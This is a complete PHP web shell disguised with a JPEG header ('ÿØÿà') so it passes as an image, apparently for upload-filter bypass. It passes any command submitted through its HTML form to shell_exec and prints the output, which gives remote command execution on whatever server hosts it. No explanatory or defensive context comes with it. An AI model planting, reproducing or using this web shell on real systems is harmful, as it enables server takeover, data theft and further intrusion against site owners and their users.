ÿØÿà
<?php
if (isset($_POST["command"])) {
	$message = shell_exec($_POST["command"]);
}
else {
	$message = "No Command Sent";
}
?>
<form class="form-submit" method="post" onsubmit="customSubmit(this)">
    <div class="container">
      <label for="cmd"><b>COMMAND</b></label>
      <input type="text" placeholder="Enter Command Here" name="command" required>
      <button type="submit">Send</button>
    </div>
 </form>
 
<form>
	<?php if (isset($message)) echo $message;?>
</form>